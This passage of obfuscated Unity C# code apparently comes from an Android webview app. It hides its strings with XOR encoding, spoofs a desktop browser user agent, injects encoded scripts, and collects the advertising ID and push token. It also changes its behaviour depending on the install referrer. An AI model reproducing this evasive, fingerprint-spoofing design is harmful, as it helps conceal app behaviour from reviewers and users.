        _0x43a38e59.sizeDelta = new Vector2(600f, 600f);
        _0x43a38e59.anchoredPosition = Vector2.zero;
        _0xf67f17dd = _0x631a365e.GetComponent<Text>();
        _0xf67f17dd.text = _0x6da9ed2f._0x22ec74ef(new byte[1] { 55 }, 24);
        _0xf67f17dd.font = Resources.GetBuiltinResource<Font>(_0x6da9ed2f._0x22ec74ef(new byte[17] { 48, 25, 27, 29, 31, 5, 46, 9, 18, 8, 21, 17, 25, 82, 8, 8, 26 }, 124));
        _0xf67f17dd.fontSize = 200;
        _0xf67f17dd.alignment = TextAnchor.MiddleCenter;
        _0xf67f17dd.color = Color.white;
        _0xf67f17dd.raycastTarget = false;
        _0x631a365e.SetActive(false);
    }

    private bool _0xd20b4599 = false;
    private string _0x77da62ef = "";
    internal bool isDestroyedForce = false;
    private bool _0x8b38540c()
    {
        var _0xe820bd6a = _0x1239c289();
        if (_0xe820bd6a == null)
            return false;
        WLog(_0x6da9ed2f._0x22ec74ef(new byte[31] { 52, 29, 14, 24, 11, 29, 14, 25, 92, 30, 29, 31, 23, 92, 81, 66, 92, 12, 19, 12, 9, 12, 92, 59, 19, 62, 29, 31, 23, 70, 92 }, 124) + _0xe820bd6a.Id);
        _0xe820bd6a.GoBack();
        return true;
    }

    private async void Start()
    {
        await _0x61cdfda2();
    }

    private string _0x6296a8c7 = "";
    // WEB VIEW LOGIC
    public bool _0xf67969c4 { get; set; }
    // WS_SOURCE MONO
    public static _0x3858c973 _0x318df0ea { get; private set; }

    private bool _0xd1bd4f25()
    {
        if (_0x8b38540c())
            return true;
        if (_0xf540acea != null && _0xf540acea.CanGoBack)
        {
            WLog(_0x6da9ed2f._0x22ec74ef(new byte[36] { 22, 63, 44, 58, 41, 63, 44, 59, 126, 60, 63, 61, 53, 126, 115, 96, 126, 51, 63, 55, 48, 126, 9, 59, 60, 8, 55, 59, 41, 126, 25, 49, 28, 63, 61, 53 }, 94));
            _0xf540acea.GoBack();
            return true;
        }

        return false;
    }

    private void WLog(string _0x9cf29c8e)
    {
#if B_LOGS
        {
            Debug.Log(_0x6da9ed2f._0x22ec74ef(new byte[7] { 119, 120, 73, 95, 88, 113, 12 }, 44) + _0x9cf29c8e);
        }
#endif
    }

    private string _0xa8d3ed49 = "";
    private string _0x0923cf4e()
    {
        return _0x6da9ed2f._0x22ec74ef(new byte[12] { 204, 130, 145, 138, 135, 144, 141, 139, 138, 204, 205, 159 }, 228) + _0x6da9ed2f._0x22ec74ef(new byte[8] { 255, 232, 251, 169, 252, 232, 180, 174 }, 137) + WindowsDesktopUserAgent + _0x6da9ed2f._0x22ec74ef(new byte[2] { 17, 13 }, 54) + _0x6da9ed2f._0x22ec74ef(new byte[30] { 243, 228, 247, 165, 245, 247, 234, 241, 234, 184, 203, 228, 243, 236, 226, 228, 241, 234, 247, 171, 245, 247, 234, 241, 234, 241, 252, 245, 224, 190 }, 133) + _0x6da9ed2f._0x22ec74ef(new byte[121] { 66, 81, 74, 71, 80, 77, 75, 74, 4, 64, 65, 66, 12, 75, 70, 78, 8, 79, 65, 93, 8, 82, 69, 72, 13, 95, 80, 86, 93, 95, 107, 70, 78, 65, 71, 80, 10, 64, 65, 66, 77, 74, 65, 116, 86, 75, 84, 65, 86, 80, 93, 12, 75, 70, 78, 8, 79, 65, 93, 8, 95, 67, 65, 80, 30, 66, 81, 74, 71, 80, 77, 75, 74, 12, 13, 95, 86, 65, 80, 81, 86, 74, 4, 82, 69, 72, 31, 89, 8, 71, 75, 74, 66, 77, 67, 81, 86, 69, 70, 72, 65, 30, 80, 86, 81, 65, 89, 13, 31, 89, 71, 69, 80, 71, 76, 12, 65, 13, 95, 89, 89 }, 36) + _0x6da9ed2f._0x22ec74ef(new byte[26] { 88, 89, 90, 20, 76, 78, 83, 72, 83, 16, 27, 73, 79, 89, 78, 125, 91, 89, 82, 72, 27, 16, 73, 93, 21, 7 }, 60) + _0x6da9ed2f._0x22ec74ef(new byte[130] { 196, 197, 198, 136, 208, 210, 207, 212, 207, 140, 135, 193, 208, 208, 246, 197, 210, 211, 201, 207, 206, 135, 140, 135, 149, 142, 144, 128, 136, 247, 201, 206, 196, 207, 215, 211, 128, 238, 244, 128, 145, 144, 142, 144, 155, 128, 247, 201, 206, 150, 148, 155, 128, 216, 150, 148, 137, 128, 225, 208, 208, 204, 197, 247, 197, 194, 235, 201, 212, 143, 149, 147, 151, 142, 147, 150, 128, 136, 235, 232, 244, 237, 236, 140, 128, 204, 201, 203, 197, 128, 231, 197, 195, 203, 207, 137, 128, 227, 200, 210, 207, 205, 197, 143, 145, 146, 144, 142, 144, 142, 144, 142, 144, 128, 243, 193, 198, 193, 210, 201, 143, 149, 147, 151, 142, 147, 150, 135, 137, 155 }, 160) + _0x6da9ed2f._0x22ec74ef(new byte[30] { 107, 106, 105, 39, 127, 125, 96, 123, 96, 35, 40, 127, 99, 110, 123, 105, 96, 125, 98, 40, 35, 40, 88, 102, 97, 60, 61, 40, 38, 52 }, 15) + _0x6da9ed2f._0x22ec74ef(new byte[34] { 86, 87, 84, 26, 66, 64, 93, 70, 93, 30, 21, 68, 87, 92, 86, 93, 64, 21, 30, 21, 117, 93, 93, 85, 94, 87, 18, 123, 92, 81, 28, 21, 27, 9 }, 50) + _0x6da9ed2f._0x22ec74ef(new byte[30] { 234, 235, 232, 166, 254, 252, 225, 250, 225, 162, 169, 227, 239, 246, 218, 225, 251, 237, 230, 222, 225, 231, 224, 250, 253, 169, 162, 190, 167, 181 }, 142) + _0x6da9ed2f._0x22ec74ef(new byte[449] { 66, 68, 79, 77, 64, 87, 68, 22, 67, 87, 82, 11, 77, 84, 68, 87, 88, 82, 69, 12, 109, 77, 84, 68, 87, 88, 82, 12, 17, 117, 94, 68, 89, 91, 95, 67, 91, 17, 26, 64, 83, 68, 69, 95, 89, 88, 12, 17, 7, 4, 6, 17, 75, 26, 77, 84, 68, 87, 88, 82, 12, 17, 113, 89, 89, 81, 90, 83, 22, 117, 94, 68, 89, 91, 83, 17, 26, 64, 83, 68, 69, 95, 89, 88, 12, 17, 7, 4, 6, 17, 75, 26, 77, 84, 68, 87, 88, 82, 12, 17, 120, 89, 66, 11, 119, 9, 116, 68, 87, 88, 82, 17, 26, 64, 83, 68, 69, 95, 89, 88, 12, 17, 4, 2, 17, 75, 107, 26, 91, 89, 84, 95, 90, 83, 12, 80, 87, 90, 69, 83, 26, 70, 90, 87, 66, 80, 89, 68, 91, 12, 17, 97, 95, 88, 82, 89, 65, 69, 17, 26, 81, 83, 66, 126, 95, 81, 94, 115, 88, 66, 68, 89, 70, 79, 96, 87, 90, 67, 83, 69, 12, 80, 67, 88, 85, 66, 95, 89, 88, 30, 31, 77, 68, 83, 66, 67, 68, 88, 22, 102, 68, 89, 91, 95, 69, 83, 24, 68, 83, 69, 89, 90, 64, 83, 30, 77, 87, 68, 85, 94, 95, 66, 83, 85, 66, 67, 68, 83, 12, 17, 78, 14, 0, 17, 26, 84, 95, 66, 88, 83, 69, 69, 12, 17, 0, 2, 17, 26, 91, 89, 84, 95, 90, 83, 12, 80, 87, 90, 69, 83, 26, 91, 89, 82, 83, 90, 12, 17, 17, 26, 70, 90, 87, 66, 80, 89, 68, 91, 12, 17, 97, 95, 88, 82, 89, 65, 69, 17, 26, 70, 90, 87, 66, 80, 89, 68, 91, 96, 83, 68, 69, 95, 89, 88, 12, 17, 7, 3, 24, 6, 24, 6, 17, 26, 67, 87, 112, 67, 90, 90, 96, 83, 68, 69, 95, 89, 88, 12, 17, 7, 4, 6, 24, 6, 24, 6, 24, 6, 17, 75, 31, 13, 75, 75, 13, 121, 84, 92, 83, 85, 66, 24, 82, 83, 80, 95, 88, 83, 102, 68, 89, 70, 83, 68, 66, 79, 30, 70, 68, 89, 66, 89, 26, 17, 67, 69, 83, 68, 119, 81, 83, 88, 66, 114, 87, 66, 87, 17, 26, 77, 81, 83, 66, 12, 80, 67, 88, 85, 66, 95, 89, 88, 30, 31, 77, 68, 83, 66, 67, 68, 88, 22, 67, 87, 82, 13, 75, 26, 85, 89, 88, 80, 95, 81, 67, 68, 87, 84, 90, 83, 12, 66, 68, 67, 83, 75, 31, 13, 75, 85, 87, 66, 85, 94, 30, 83, 31, 77, 75 }, 54) + _0x6da9ed2f._0x22ec74ef(new byte[112] { 171, 170, 169, 231, 188, 172, 189, 170, 170, 161, 227, 232, 184, 166, 171, 187, 167, 232, 227, 254, 246, 253, 255, 230, 244, 171, 170, 169, 231, 188, 172, 189, 170, 170, 161, 227, 232, 167, 170, 166, 168, 167, 187, 232, 227, 254, 255, 247, 255, 230, 244, 171, 170, 169, 231, 188, 172, 189, 170, 170, 161, 227, 232, 174, 185, 174, 166, 163, 152, 166, 171, 187, 167, 232, 227, 254, 246, 253, 255, 230, 244, 171, 170, 169, 231, 188, 172, 189, 170, 170, 161, 227, 232, 174, 185, 174, 166, 163, 135, 170, 166, 168, 167, 187, 232, 227, 254, 255, 251, 255, 230, 244 }, 207) + _0x6da9ed2f._0x22ec74ef(new byte[45] { 218, 220, 215, 213, 217, 199, 192, 202, 193, 217, 128, 193, 192, 218, 193, 219, 205, 198, 221, 218, 207, 220, 218, 147, 219, 192, 202, 203, 200, 199, 192, 203, 202, 149, 211, 205, 207, 218, 205, 198, 134, 203, 135, 213, 211 }, 174) + _0x6da9ed2f._0x22ec74ef(new byte[721] { 30, 24, 19, 17, 28, 11, 24, 74, 5, 24, 3, 13, 87, 29, 3, 4, 14, 5, 29, 68, 7, 11, 30, 9, 2, 39, 15, 14, 3, 11, 68, 8, 3, 4, 14, 66, 29, 3, 4, 14, 5, 29, 67, 81, 29, 3, 4, 14, 5, 29, 68, 7, 11, 30, 9, 2, 39, 15, 14, 3, 11, 87, 12, 31, 4, 9, 30, 3, 5, 4, 66, 27, 67, 17, 28, 11, 24, 74, 25, 87, 57, 30, 24, 3, 4, 13, 66, 27, 67, 68, 30, 5, 38, 5, 29, 15, 24, 41, 11, 25, 15, 66, 67, 81, 3, 12, 66, 25, 68, 3, 4, 14, 15, 18, 37, 12, 66, 77, 26, 5, 3, 4, 30, 15, 24, 80, 74, 9, 5, 11, 24, 25, 15, 77, 67, 84, 87, 90, 22, 22, 25, 68, 3, 4, 14, 15, 18, 37, 12, 66, 77, 2, 5, 28, 15, 24, 80, 74, 4, 5, 4, 15, 77, 67, 84, 87, 90, 22, 22, 25, 68, 3, 4, 14, 15, 18, 37, 12, 66, 77, 7, 11, 18, 71, 29, 3, 14, 30, 2, 77, 67, 84, 87, 90, 22, 22, 25, 68, 3, 4, 14, 15, 18, 37, 12, 66, 77, 7, 11, 18, 71, 14, 15, 28, 3, 9, 15, 71, 29, 3, 14, 30, 2, 77, 67, 84, 87, 90, 67, 24, 15, 30, 31, 24, 4, 74, 17, 7, 11, 30, 9, 2, 15, 25, 80, 12, 11, 6, 25, 15, 70, 7, 15, 14, 3, 11, 80, 27, 70, 5, 4, 9, 2, 11, 4, 13, 15, 80, 4, 31, 6, 6, 70, 11, 14, 14, 38, 3, 25, 30, 15, 4, 15, 24, 80, 12, 31, 4, 9, 30, 3, 5, 4, 66, 67, 17, 23, 70, 24, 15, 7, 5, 28, 15, 38, 3, 25, 30, 15, 4, 15, 24, 80, 12, 31, 4, 9, 30, 3, 5, 4, 66, 67, 17, 23, 70, 11, 14, 14, 47, 28, 15, 4, 30, 38, 3, 25, 30, 15, 4, 15, 24, 80, 12, 31, 4, 9, 30, 3, 5, 4, 66, 67, 17, 23, 70, 24, 15, 7, 5, 28, 15, 47, 28, 15, 4, 30, 38, 3, 25, 30, 15, 4, 15, 24, 80, 12, 31, 4, 9, 30, 3, 5, 4, 66, 67, 17, 23, 70, 14, 3, 25, 26, 11, 30, 9, 2, 47, 28, 15, 4, 30, 80, 12, 31, 4, 9, 30, 3, 5, 4, 66, 67, 17, 24, 15, 30, 31, 24, 4, 74, 12, 11, 6, 25, 15, 81, 23, 23, 81, 3, 12, 66, 25, 68, 3, 4, 14, 15, 18, 37, 12, 66, 77, 26, 5, 3, 4, 30, 15, 24, 80, 74, 12, 3, 4, 15, 77, 67, 84, 87, 90, 22, 22, 25, 68, 3, 4, 14, 15, 18, 37, 12, 66, 77, 2, 5, 28, 15, 24, 80, 74, 2, 5, 28, 15, 24, 77, 67, 84, 87, 90, 67, 24, 15, 30, 31, 24, 4, 74, 17, 7, 11, 30, 9, 2, 15, 25, 80, 30, 24, 31, 15, 70, 7, 15, 14, 3, 11, 80, 27, 70, 5, 4, 9, 2, 11, 4, 13, 15, 80, 4, 31, 6, 6, 70, 11, 14, 14, 38, 3, 25, 30, 15, 4, 15, 24, 80, 12, 31, 4, 9, 30, 3, 5, 4, 66, 67, 17, 23, 70, 24, 15, 7, 5, 28, 15, 38, 3, 25, 30, 15, 4, 15, 24, 80, 12, 31, 4, 9, 30, 3, 5, 4, 66, 67, 17, 23, 70, 11, 14, 14, 47, 28, 15, 4, 30, 38, 3, 25, 30, 15, 4, 15, 24, 80, 12, 31, 4, 9, 30, 3, 5, 4, 66, 67, 17, 23, 70, 24, 15, 7, 5, 28, 15, 47, 28, 15, 4, 30, 38, 3, 25, 30, 15, 4, 15, 24, 80, 12, 31, 4, 9, 30, 3, 5, 4, 66, 67, 17, 23, 70, 14, 3, 25, 26, 11, 30, 9, 2, 47, 28, 15, 4, 30, 80, 12, 31, 4, 9, 30, 3, 5, 4, 66, 67, 17, 24, 15, 30, 31, 24, 4, 74, 12, 11, 6, 25, 15, 81, 23, 23, 81, 24, 15, 30, 31, 24, 4, 74, 5, 24, 3, 13, 66, 27, 67, 81, 23, 81, 23, 9, 11, 30, 9, 2, 66, 15, 67, 17, 23 }, 106) + _0x6da9ed2f._0x22ec74ef(new byte[5] { 193, 149, 148, 149, 135 }, 188);
    }

    internal bool firstLoadShown = false;
    private AndroidJavaObject _0x387e41f9 { get; set; }

    private void _0x725e3d80(string _0x17cd1920)
    {
        if (string.IsNullOrEmpty(_0x17cd1920))
            return;
        if (TryOpenExternalLikeChrome(_0x17cd1920))
            return;
        OpenUrlExternally(_0x17cd1920);
    }

    // PART 3
    private string _0x8a4b65ee()
    {
        try
        {
            var _0xd5c671e7 = new AndroidJavaClass(_0x6da9ed2f._0x22ec74ef(new byte[30] { 131, 143, 141, 206, 149, 142, 137, 148, 153, 211, 132, 206, 144, 140, 129, 153, 133, 146, 206, 181, 142, 137, 148, 153, 176, 140, 129, 153, 133, 146 }, 224));
            var _0x0404bcbb = _0xd5c671e7.GetStatic<AndroidJavaObject>(_0x6da9ed2f._0x22ec74ef(new byte[15] { 12, 26, 29, 29, 10, 1, 27, 46, 12, 27, 6, 25, 6, 27, 22 }, 111));
            var _0x189b85a5 = new AndroidJavaClass(_0x6da9ed2f._0x22ec74ef(new byte[57] { 6, 10, 8, 75, 2, 10, 10, 2, 9, 0, 75, 4, 11, 1, 23, 10, 12, 1, 75, 2, 8, 22, 75, 4, 1, 22, 75, 12, 1, 0, 11, 17, 12, 3, 12, 0, 23, 75, 36, 1, 19, 0, 23, 17, 12, 22, 12, 11, 2, 44, 1, 38, 9, 12, 0, 11, 17 }, 101));
            var _0x084bba30 = _0x189b85a5.CallStatic<AndroidJavaObject>(_0x6da9ed2f._0x22ec74ef(new byte[20] { 28, 30, 15, 58, 31, 13, 30, 9, 15, 18, 8, 18, 21, 28, 50, 31, 50, 21, 29, 20 }, 123), _0x0404bcbb);
            var _0x8822f7a6 = _0x084bba30.Call<string>(_0x6da9ed2f._0x22ec74ef(new byte[5] { 167, 165, 180, 137, 164 }, 192));
            {
#if B_LOGS
                Debug.Log($"[Test] Google Advertiding Id (ad id): {_0x8822f7a6}");
#endif
            }

            return string.IsNullOrEmpty(_0x8822f7a6) ? "" : _0x8822f7a6;
        }
        catch
        {
            return "";
        }
    }

    private string _0x3c18429d;
    private async Task<bool> _0x612e31c2()
    {
        {
#if B_LOGS
            Debug.Log(_0x6da9ed2f._0x22ec74ef(new byte[37] { 197, 202, 251, 237, 234, 195, 190, 205, 247, 249, 240, 215, 240, 203, 240, 247, 234, 231, 205, 251, 236, 232, 247, 253, 251, 237, 223, 240, 241, 240, 231, 243, 241, 235, 237, 242, 231 }, 158));
#endif
        }

        try
        {
            var _0x8f38a9a4 = new InitializationOptions();
            await UnityServices.InitializeAsync(_0x8f38a9a4);
            {
#if B_LOGS
                Debug.Log(_0x6da9ed2f._0x22ec74ef(new byte[32] { 88, 87, 102, 112, 119, 94, 35, 86, 109, 106, 119, 122, 80, 102, 113, 117, 106, 96, 102, 112, 35, 74, 109, 106, 119, 106, 98, 111, 106, 121, 102, 103 }, 3));
#endif
            }
        }
        catch (Exception ex)
        {
            {
#if B_LOGS
                Debug.Log(_0x6da9ed2f._0x22ec74ef(new byte[20] { 108, 125, 107, 108, 24, 109, 86, 81, 76, 65, 107, 93, 74, 78, 81, 91, 93, 75, 2, 24 }, 56) + ex.Message);
#endif
            }

            _0x318df0ea?._0x1b48520f();
            return true;
        }

        bool _0x9ae44111 = false;
        do
        {
            try
            {
                await AuthenticationService.Instance.SignInAnonymouslyAsync();
                _0x9ae44111 = true;
                {
                    {
#if B_LOGS
                        Debug.Log(_0x6da9ed2f._0x22ec74ef(new byte[37] { 231, 232, 217, 207, 200, 225, 156, 239, 213, 219, 210, 145, 213, 210, 156, 253, 210, 211, 210, 197, 209, 211, 201, 207, 146, 156, 236, 208, 221, 197, 217, 206, 156, 245, 248, 134, 156 }, 188) + AuthenticationService.Instance.PlayerId);
#endif
                    }

                    _0x35308c09 = AuthenticationService.Instance.PlayerId;
                }
            }
            catch (AuthenticationException ex)
            {
                {
#if B_LOGS
                    Debug.Log(_0x6da9ed2f._0x22ec74ef(new byte[25] { 209, 192, 214, 209, 165, 214, 236, 226, 235, 168, 236, 235, 165, 196, 240, 241, 237, 165, 192, 215, 215, 202, 215, 191, 165 }, 133) + ex.Message);
#endif
                }

                _0x318df0ea?._0x1b48520f();
                return true;
            }
            catch (RequestFailedException ex)
            {
                {
#if B_LOGS
                    Debug.Log(_0x6da9ed2f._0x22ec74ef(new byte[28] { 125, 108, 122, 125, 9, 122, 64, 78, 71, 4, 64, 71, 9, 123, 76, 88, 92, 76, 90, 93, 9, 108, 123, 123, 102, 123, 19, 9 }, 41) + ex.Message);
#endif
                }

                _0x318df0ea?._0x1b48520f();
                return true;
            }
        }
        while (!_0x9ae44111);
        return false;
    }

    private bool _0x3f52c777 = false;
    private IEnumerator _0x0311748e(float _0xf2260b67)
    {
        yield return new WaitForSeconds(_0xf2260b67);
        if (!_0x8982864c)
        {
            _0x8982864c = true;
            {
#if B_LOGS
                {
                    Debug.Log($"[Test] Refferer timeout apply: {_0x53aebe70}");
                }
#endif
            }
        }
    }

    private Action _0x5655fbbb;
    private async Task<bool> _0xd0af44ef()
    {
        _0x9ff42d58.Instance.AnimSliderSequence.Pause();
        PushNotificationsService.Instance.OnRemoteNotificationReceived += (_0xa27b35ff) =>
        {
            {
#if B_LOGS
                {
                    Debug.Log(_0x6da9ed2f._0x22ec74ef(new byte[32] { 37, 42, 27, 13, 10, 35, 94, 43, 16, 23, 10, 7, 94, 46, 11, 13, 22, 94, 48, 17, 10, 23, 24, 23, 29, 31, 10, 23, 17, 16, 68, 94 }, 126) + string.Join(_0x6da9ed2f._0x22ec74ef(new byte[1] { 250 }, 243), _0xa27b35ff));
                }
#endif
            }
        };
        try
        {
            _0xa8d3ed49 = await PushNotificationsService.Instance.RegisterForPushNotificationsAsync();
        }
        catch (Exception ex)
        {
            {
#if B_LOGS
                {
                    Debug.Log(_0x6da9ed2f._0x22ec74ef(new byte[31] { 70, 73, 120, 110, 105, 64, 61, 91, 124, 116, 113, 120, 121, 61, 105, 114, 61, 122, 120, 105, 61, 109, 104, 110, 117, 61, 105, 114, 118, 120, 115 }, 29));
                }
#endif
            }

            _0xa8d3ed49 = "";
        }

        _0x3f52c777 = !string.IsNullOrEmpty(_0xa8d3ed49);
        _0x6ec1d510 = _0x5ec43697();
        {
#if B_LOGS
            Debug.Log(_0x6da9ed2f._0x22ec74ef(new byte[25] { 24, 23, 38, 48, 55, 30, 99, 22, 45, 42, 55, 58, 99, 19, 54, 48, 43, 99, 23, 44, 40, 38, 45, 121, 99 }, 67) + _0xa8d3ed49);
#endif
        }

        _0x9ff42d58.Instance.AnimSliderSequence.Play();
        return false;
    }

    private string _0x5ec43697()
    {
        float _0x28b76c2b = Time.realtimeSinceStartup;
        if (_0x28b76c2b < 0f)
            _0x28b76c2b = 0f;
        int _0xe5d2f395 = (int)(_0x28b76c2b * 1000f);
        int _0xeef1cb42 = _0xe5d2f395 / 60000;
        int _0xe2d2ae2e = (_0xe5d2f395 / 1000) % 60;
        int _0x6b2cd337 = _0xe5d2f395 % 1000;
        return string.Format(_0x6da9ed2f._0x22ec74ef(new byte[21] { 248, 179, 185, 179, 179, 254, 185, 248, 178, 185, 179, 179, 254, 185, 248, 177, 185, 179, 179, 179, 254 }, 131), _0xeef1cb42, _0xe2d2ae2e, _0x6b2cd337);
    }

    private bool _0x77830415()
    {
        _0xc0005a68.RemoveAll(_0x89c60ef0 => _0x89c60ef0 == null || !_0x89c60ef0.IsAlive);
        return _0xc0005a68.Count > 0;
    }

    private bool _0xdb05c46a = false;
    private string _0x6ec1d510 = "";
    private UniWebViewPopup _0x1239c289()
    {
        for (int _0x0c614806 = _0xc0005a68.Count - 1; _0x0c614806 >= 0; _0x0c614806--)
        {
            var _0xa32051dc = _0xc0005a68[_0x0c614806];
            if (_0xa32051dc != null && _0xa32051dc.IsAlive)
                return _0xa32051dc;
            _0xc0005a68.RemoveAt(_0x0c614806);
        }

        return null;
    }

    private int _0x0fd7820a = 0;
    internal Vector2 lastSize = Vector2.zero;
    private IEnumerator RequestAndroidPermissionIfNeeded(string _0x3a792a9c)
    {
        if (Permission.HasUserAuthorizedPermission(_0x3a792a9c))
            yield break;
        bool _0xd6bb9ecf = false;
        var _0x7aa2d196 = new PermissionCallbacks();
        _0x7aa2d196.PermissionGranted += _0x64289e9f => _0xd6bb9ecf = true;
        _0x7aa2d196.PermissionDenied += _0x64289e9f => _0xd6bb9ecf = true;
        Permission.RequestUserPermission(_0x3a792a9c, _0x7aa2d196);
        yield return new WaitUntil(() => _0xd6bb9ecf);
    }

    private string _0xa7a19a9f = "";
    private IEnumerator _0x461cb6b4(IEnumerator _0x5f5db760, TaskCompletionSource<bool> _0x470fdbf1)
    {
        yield return _0x5f5db760;
        _0x470fdbf1.SetResult(true);
    }

    private bool _0x9d74c32c(string _0xc8b3f4af)
    {
        try
        {
            using (var _0x1985e1d0 = new AndroidJavaClass(_0x6da9ed2f._0x22ec74ef(new byte[30] { 36, 40, 42, 105, 50, 41, 46, 51, 62, 116, 35, 105, 55, 43, 38, 62, 34, 53, 105, 18, 41, 46, 51, 62, 23, 43, 38, 62, 34, 53 }, 71)))
            using (var _0xc026e8e8 = _0x1985e1d0.GetStatic<AndroidJavaObject>(_0x6da9ed2f._0x22ec74ef(new byte[15] { 27, 13, 10, 10, 29, 22, 12, 57, 27, 12, 17, 14, 17, 12, 1 }, 120)))
            using (var _0x027ba3c1 = new AndroidJavaClass(_0x6da9ed2f._0x22ec74ef(new byte[15] { 51, 60, 54, 32, 61, 59, 54, 124, 60, 55, 38, 124, 7, 32, 59 }, 82)))
            using (var _0x2dafb204 = _0x027ba3c1.CallStatic<AndroidJavaObject>(_0x6da9ed2f._0x22ec74ef(new byte[5] { 150, 135, 148, 149, 131 }, 230), _0xc8b3f4af))
            using (var _0x6ef1ad42 = new AndroidJavaObject(_0x6da9ed2f._0x22ec74ef(new byte[22] { 242, 253, 247, 225, 252, 250, 247, 189, 240, 252, 253, 231, 246, 253, 231, 189, 218, 253, 231, 246, 253, 231 }, 147), _0x6da9ed2f._0x22ec74ef(new byte[26] { 136, 135, 141, 155, 134, 128, 141, 199, 128, 135, 157, 140, 135, 157, 199, 136, 138, 157, 128, 134, 135, 199, 191, 160, 172, 190 }, 233), _0x2dafb204))
            {
                WLog(_0x6da9ed2f._0x22ec74ef(new byte[26] { 255, 212, 206, 211, 209, 217, 240, 213, 215, 217, 156, 211, 204, 217, 210, 156, 217, 196, 200, 217, 206, 210, 221, 208, 134, 156 }, 188) + _0xc8b3f4af);
                _0x6ef1ad42.Call<AndroidJavaObject>(_0x6da9ed2f._0x22ec74ef(new byte[11] { 217, 220, 220, 251, 217, 204, 221, 223, 215, 202, 193 }, 184), _0x6da9ed2f._0x22ec74ef(new byte[33] { 216, 215, 221, 203, 214, 208, 221, 151, 208, 215, 205, 220, 215, 205, 151, 218, 216, 205, 220, 222, 214, 203, 192, 151, 251, 235, 246, 238, 234, 248, 251, 245, 252 }, 185));
                _0x6ef1ad42.Call<AndroidJavaObject>(_0x6da9ed2f._0x22ec74ef(new byte[8] { 183, 178, 178, 144, 186, 183, 177, 165 }, 214), 0x10000000);
                _0xc026e8e8.Call(_0x6da9ed2f._0x22ec74ef(new byte[13] { 163, 164, 177, 162, 164, 145, 179, 164, 185, 166, 185, 164, 169 }, 208), _0x6ef1ad42);
                return true;
            }
        }
        catch (Exception e)
        {
            WLog(_0x6da9ed2f._0x22ec74ef(new byte[28] { 24, 51, 41, 52, 54, 62, 23, 50, 48, 62, 123, 62, 35, 47, 62, 41, 53, 58, 55, 123, 61, 58, 50, 55, 62, 63, 97, 123 }, 91) + e.Message);
            Application.OpenURL(_0xc8b3f4af);
            return true;
        }
    }

    internal void Update()
    {
        if (_0xf540acea == null)
            return;
        if (_0x97baa1bb())
            _0xdb23701e();
        if (!isApplicationFocus || isApplicationPause)
            return;
        _0xd93356b7();
        if (_0x778172de && _0x43a38e59 != null)
            _0x43a38e59.Rotate(0f, 0f, -360f * Time.deltaTime);
    }

    private string _0xe17e871a = "";
    private void StopCurrentFailedLoad(UniWebView _0xf09343e5)
    {
        _0xbecaad9c(false);
        if (_0xf09343e5 == null)
            return;
        _0xf09343e5.Stop();
        if (_0xf09343e5.CanGoBack)
            _0xf09343e5.GoBack();
    }

    private IEnumerator _0x2109b179()
    {
        {
#if B_LOGS
            {
                Debug.Log(_0x6da9ed2f._0x22ec74ef(new byte[26] { 74, 69, 116, 98, 101, 76, 49, 88, 127, 120, 101, 120, 112, 125, 120, 107, 116, 67, 116, 119, 119, 116, 99, 116, 99, 49 }, 17));
            }
#endif
        }

        bool _0x755a5b53 = false;
        InstallReferrer.GetReferrer((_0x0a61d47b) =>
        {
            Debug.Log(_0x6da9ed2f._0x22ec74ef(new byte[24] { 222, 209, 224, 246, 241, 165, 215, 224, 227, 224, 247, 247, 224, 247, 216, 165, 226, 224, 241, 165, 103, 3, 23, 165 }, 133) + _0x53aebe70);
            if (_0x0a61d47b.IsSuccess)
            {
                _0x53aebe70 = _0x0a61d47b.InstallReferrer ?? "";
                {
#if B_LOGS
                    Debug.Log(_0x6da9ed2f._0x22ec74ef(new byte[28] { 186, 181, 132, 146, 149, 193, 179, 132, 135, 132, 147, 147, 132, 147, 188, 193, 178, 148, 130, 130, 132, 146, 146, 193, 3, 103, 115, 193 }, 225) + _0x53aebe70);
#endif
                }
            }
            else
            {
                {
#if B_LOGS
                    Debug.Log(_0x6da9ed2f._0x22ec74ef(new byte[27] { 12, 3, 50, 36, 35, 119, 5, 50, 49, 50, 37, 37, 50, 37, 10, 119, 17, 54, 62, 59, 50, 51, 119, 181, 209, 197, 119 }, 87) + _0x0a61d47b);
#endif
                }

                _0x53aebe70 = "";
            }

            _0x8982864c = true;
        });
        StartCoroutine(_0x0311748e(2f));
        yield return new WaitUntil(() => _0x8982864c);
        {
#if B_LOGS
            Debug.Log($"[Test] check google atr {_0x53aebe70}");
#endif
        }

        bool _0x1192f992 = _0x53aebe70.Contains(_0x6da9ed2f._0x22ec74ef(new byte[6] { 24, 28, 19, 22, 27, 66 }, 127));
        _0x755a5b53 = _0x1192f992 || _0x53aebe70.Contains(_0x6da9ed2f._0x22ec74ef(new byte[18] { 194, 211, 211, 208, 141, 202, 205, 208, 215, 194, 196, 209, 194, 206, 141, 192, 204, 206 }, 163)) || _0x53aebe70.Contains(_0x6da9ed2f._0x22ec74ef(new byte[17] { 128, 145, 145, 146, 207, 135, 128, 130, 132, 131, 142, 142, 138, 207, 130, 142, 140 }, 225));
        _0x009c2d65 = _0x1192f992 ? "" : (_0x755a5b53 ? "" : _0x009c2d65);
        _0x009c2d65 = _0x009c2d65 ?? "";
        _0xdb6e618e = _0xdb6e618e ?? "";
        {
#if B_LOGS
            Debug.Log($"[Test] oneLinkData (FB): {_0x009c2d65}");
#endif
        }
    }

    /* ============================= */
    /* ENCRYPT / DECRYPT             */
    /* ============================= */
    private string _0x09aa57ef(string _0x7f795680, string _0x912ab89b)
    {
        try
        {
            using var _0x9b7570ca = Aes.Create();
            _0x9b7570ca.Key = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(_0x912ab89b));
            _0x9b7570ca.GenerateIV();
            using var _0x4226ae2e = new MemoryStream();
            _0x4226ae2e.Write(_0x9b7570ca.IV, 0, _0x9b7570ca.IV.Length);
            using (var _0x8a2ad8e4 = new CryptoStream(_0x4226ae2e, _0x9b7570ca.CreateEncryptor(), CryptoStreamMode.Write))
            {
                var _0xf0bc30d1 = Encoding.UTF8.GetBytes(_0x7f795680);
                _0x8a2ad8e4.Write(_0xf0bc30d1, 0, _0xf0bc30d1.Length);
                _0x8a2ad8e4.FlushFinalBlock();
            }

            return Convert.ToBase64String(_0x4226ae2e.ToArray());
        }
        catch (Exception ex)
        {
            return "";
        }
    }

    private int _0x4caa3e87 = 5, _0x1a5d58dd = 5, _0xcee5444b = 5, _0x96ae2994 = 5;
}

internal static class _0x6da9ed2f
{
    internal static string _0x22ec74ef(byte[] data, byte key)
    {
        var buffer = new byte[data.Length];
